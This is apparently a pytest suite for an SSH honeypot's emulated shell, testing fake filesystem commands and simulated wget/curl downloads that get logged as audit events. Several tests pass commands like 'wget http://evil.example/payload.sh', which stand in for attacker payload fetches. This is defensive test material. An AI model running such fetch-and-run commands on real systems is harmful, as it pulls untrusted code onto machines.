import pytest

from honeypot.audit import AuditRecorder
from honeypot.fs import BaseFS, VFS
from honeypot.shell import ShellContext
from honeypot.shell.commands import default_registry


class MemorySink:
    """Test double for CefLogger: collects Events instead of writing CEF."""

    def __init__(self):
        self.events = []

    def emit(self, event):
        self.events.append(event)


@pytest.fixture
def env():
    base = BaseFS(
        {
            "entries": {
                "/": {"type": "dir"},
                "/etc": {"type": "dir"},
                "/etc/passwd": {"type": "file", "content": "root:x:0:0::/root:/bin/bash\n"},
                "/root": {"type": "dir"},
                "/tmp": {"type": "dir"},
            }
        }
    )
    vfs = VFS(base, cwd="/root", home="/root")
    out: list[str] = []
    sink = MemorySink()
    audit = AuditRecorder(sink)
    ctx = ShellContext(
        vfs=vfs,
        audit=audit,
        system_profile={"hostname": "test-host"},
        session_id="sid",
        src="1.2.3.4",
        username="root",
        pty_allocated=False,
    )
    ctx.attach_writer(out.append)
    return ctx, default_registry(), out, sink


def run_cmd(ctx, reg, name, *args):
    return reg[name].run(list(args), ctx)


# ---- mkdir / touch / rm ------------------------------------------------

def test_mkdir_basic(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "mkdir", "/tmp/a") == 0
    assert ctx.vfs.is_dir("/tmp/a")


def test_mkdir_existing_fails(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "mkdir", "/tmp") == 1


def test_mkdir_p_nested(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "mkdir", "-p", "/tmp/a/b/c") == 0
    assert ctx.vfs.is_dir("/tmp/a/b/c")


def test_mkdir_p_idempotent(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "mkdir", "-p", "/tmp/x") == 0
    assert run_cmd(ctx, reg, "mkdir", "-p", "/tmp/x") == 0


def test_touch_creates_empty(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "touch", "/tmp/f") == 0
    assert ctx.vfs.read("/tmp/f") == b""


def test_rm_file(env):
    ctx, reg, _, _ = env
    run_cmd(ctx, reg, "touch", "/tmp/f")
    assert run_cmd(ctx, reg, "rm", "/tmp/f") == 0
    assert not ctx.vfs.exists("/tmp/f")


def test_rm_dir_without_r_fails(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "rm", "/etc") == 1
    assert ctx.vfs.exists("/etc")


def test_rm_recursive(env):
    ctx, reg, _, _ = env
    run_cmd(ctx, reg, "mkdir", "-p", "/tmp/a/b")
    run_cmd(ctx, reg, "touch", "/tmp/a/b/c")
    run_cmd(ctx, reg, "touch", "/tmp/a/d")
    assert run_cmd(ctx, reg, "rm", "-rf", "/tmp/a") == 0
    assert not ctx.vfs.exists("/tmp/a")


def test_rm_force_missing(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "rm", "-f", "/nope") == 0


def test_rm_missing_without_force(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "rm", "/nope") == 1


# ---- shell utilities ---------------------------------------------------

def test_history_lists_with_numbering(env):
    ctx, reg, out, _ = env
    ctx.history.extend(["pwd", "id", "ls /"])
    out.clear()
    run_cmd(ctx, reg, "history")
    text = "".join(out)
    assert "    1  pwd" in text
    assert "    2  id" in text
    assert "    3  ls /" in text


def test_history_clear(env):
    ctx, reg, _, _ = env
    ctx.history.extend(["a", "b"])
    assert run_cmd(ctx, reg, "history", "-c") == 0
    assert ctx.history == []


def test_history_limit(env):
    ctx, reg, out, _ = env
    ctx.history.extend(["one", "two", "three", "four"])
    out.clear()
    run_cmd(ctx, reg, "history", "2")
    text = "".join(out)
    assert "three" in text and "four" in text
    assert "one" not in text and "two" not in text


def test_clear_emits_ansi(env):
    ctx, reg, out, _ = env
    out.clear()
    run_cmd(ctx, reg, "clear")
    assert "\x1b[H\x1b[2J" in "".join(out)


def test_ps_default(env):
    ctx, reg, out, _ = env
    out.clear()
    run_cmd(ctx, reg, "ps")
    text = "".join(out)
    assert "PID" in text and "bash" in text and " ps" in text


def test_ps_aux(env):
    ctx, reg, out, _ = env
    out.clear()
    run_cmd(ctx, reg, "ps", "aux")
    text = "".join(out)
    assert "USER" in text and "sshd" in text


# ---- wget / curl -------------------------------------------------------

def test_wget_creates_file_and_logs_event(env):
    ctx, reg, _, audit = env
    rc = run_cmd(ctx, reg, "wget", "http://evil.example/payload.sh")
    assert rc == 0
    assert ctx.vfs.is_file("/root/payload.sh")
    matches = [e for e in audit.events if e.name == "download_attempt"]
    assert len(matches) == 1
    assert matches[0].extension["tool"] == "wget"
    assert matches[0].extension["requestUrl"] == "http://evil.example/payload.sh"
    assert matches[0].extension["destinationHostName"] == "evil.example"


def test_wget_O_overrides_name(env):
    ctx, reg, _, _ = env
    run_cmd(ctx, reg, "wget", "-O", "renamed", "http://evil.example/x.bin")
    assert ctx.vfs.is_file("/root/renamed")
    assert not ctx.vfs.exists("/root/x.bin")


def test_wget_missing_url(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "wget") == 1


def test_curl_stdout_by_default(env):
    ctx, reg, out, audit = env
    out.clear()
    rc = run_cmd(ctx, reg, "curl", "http://evil.example/x.sh")
    assert rc == 0
    assert "honeypot placeholder" in "".join(out)
    assert not ctx.vfs.exists("/root/x.sh")
    assert any(e.name == "download_attempt" for e in audit.events)


def test_curl_O_saves_file(env):
    ctx, reg, _, _ = env
    rc = run_cmd(ctx, reg, "curl", "-O", "http://evil.example/p.bin")
    assert rc == 0
    assert ctx.vfs.is_file("/root/p.bin")


def test_curl_o_named_output(env):
    ctx, reg, _, _ = env
    rc = run_cmd(ctx, reg, "curl", "-o", "saved", "http://evil.example/p")
    assert rc == 0
    assert ctx.vfs.is_file("/root/saved")


def test_curl_no_url_returns_2(env):
    ctx, reg, _, _ = env
    assert run_cmd(ctx, reg, "curl") == 2
